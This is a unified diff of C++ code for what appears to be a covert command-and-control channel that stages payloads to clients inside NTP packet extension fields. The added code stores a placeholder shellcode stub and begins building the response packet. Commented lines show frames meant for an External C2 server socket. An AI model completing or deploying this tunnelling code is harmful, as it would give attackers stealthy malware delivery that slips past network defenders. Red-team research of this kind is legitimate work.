@@ -86,6 +86,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         if (payloadArch == 0x86) {
             std::cout << "[?] X86 Payload Requested " << std::endl;
 
+
             /*
             send_frame(socket_extc2, "arch=x86", 8);
 	        send_frame(socket_extc2, "pipename=foobar", 15);
@@ -93,6 +94,25 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             
             //get frames back, laod into client class
             */
+
+            //pretend the server sent this
+            std::vector<uint8_t> tempPayload = { 0x90,0x90,0xCC,0xC3 };
+
+            //create or access client class:
+            ClientSession someClient(sessionId);
+            someClient.setForClientBuffer(tempPayload);
+            std::cout << "[?] Stored in client class: ";
+            printHexVector(someClient.getForClientBuffer());
+            
+
+            //once we have the data, create a new packet with the extension field
+            //this needs to be a size packet, which sends back the size of the payload.
+            //future packets, wtih 0x00, will send the aactual paylaod
+            NTPPacket newPacket;
+            //newPacket.addExtensionField(
+            
+            //)
+
         }
 
         else if (payloadArch == 0x64) {
@@ -111,7 +131,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         else if (payloadArch == 0x00) {
             std::cout << "[?] 0x00 continuation of getting payload" << std::endl;
             
-            //access class and get next chunk to send back. client must have req'd 0x86 or 0x64 FIRST, otherwise itll be empty.
+            //access class and get next chunk to send back. client must have req'd 0x86 or 0x64 FIRST, otherwise itll be empty.  
         }
 
         else {
